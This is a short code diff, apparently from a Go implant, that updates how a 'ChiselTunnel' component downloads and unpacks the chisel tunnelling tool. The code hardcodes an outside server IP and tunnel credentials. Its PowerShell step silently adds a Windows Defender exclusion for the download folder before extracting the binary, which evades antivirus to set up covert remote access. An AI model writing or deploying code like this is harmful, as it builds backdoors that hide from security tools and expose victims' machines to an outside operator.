@@ -16,7 +16,7 @@ import (
 	"time"
 )
 
-const chiselDownloadURL = "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz"
+const chiselDownloadURL = "https://github.com/jpillora/chisel/releases/download/v1.11.8/chisel_1.11.8_windows_amd64.zip"
 const chiselServerAddr = "45.32.121.103:7100"
 const chiselAuth = "sekret:83kFmP9qR2vL7xN4"
 
@@ -92,17 +92,17 @@ func (t *ChiselTunnel) download() error {
 		return fmt.Errorf("download HTTP %d", resp.StatusCode)
 	}
 
-	gzPath := filepath.Join(t.binDir, "chisel.gz")
-	out, err := os.Create(gzPath)
+	zipPath := filepath.Join(t.binDir, "chisel.zip")
+	out, err := os.Create(zipPath)
 	if err != nil {
-		return fmt.Errorf("create gz: %w", err)
+		return fmt.Errorf("create zip: %w", err)
 	}
 	written, _ := io.Copy(out, resp.Body)
 	out.Close()
 	log.Printf("[chisel] downloaded %d bytes", written)
 
 	log.Printf("[chisel] extracting chisel.exe...")
-	psCmd := fmt.Sprintf(`Add-MpPreference -ExclusionPath '%s' -ErrorAction SilentlyContinue; $f = [System.IO.File]::OpenRead('%s'); $g = New-Object System.IO.FileStream('%s', [System.IO.FileMode]::Create); $s = New-Object System.IO.Compression.GZipStream($f, [System.IO.Compression.CompressionMode]::Decompress); $s.CopyTo($g); $g.Close(); $f.Close(); $s.Close()`, t.binDir, gzPath, binPath)
+	psCmd := fmt.Sprintf(`Add-MpPreference -ExclusionPath '%s' -ErrorAction SilentlyContinue; Expand-Archive -Path '%s' -DestinationPath '%s' -Force`, t.binDir, zipPath, t.binDir)
 	ps := exec.Command("powershell", "-NoProfile", "-Command", psCmd)
 	if output, err := ps.CombinedOutput(); err != nil {
 		return fmt.Errorf("extract: %w - %s", err, string(output))
